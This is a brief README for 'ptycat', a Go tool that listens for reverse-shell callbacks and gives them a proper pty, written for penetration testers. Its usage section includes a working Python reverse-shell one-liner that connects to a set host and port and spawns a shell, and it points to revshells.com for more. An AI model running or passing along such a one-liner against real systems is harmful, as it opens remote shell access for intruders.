# ptycat

Aren't you tired of catching netcat/bash callbacks and forgetting how to muck with tty settings? Tired of hitting CTRL-Z and performing `stty` magic? Me too!

### Installation
```go get github.com/dropk1ck/ptycat```

### Usage
```
# full help available with -h
ptycat -l -p <port to listen on>

# use a pty-spawning shell command from something like revshells.com, such as:
export RHOST="localhost";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

```

And that's it! CTRL-C, up-arrow, tab-complete to your heart's content.
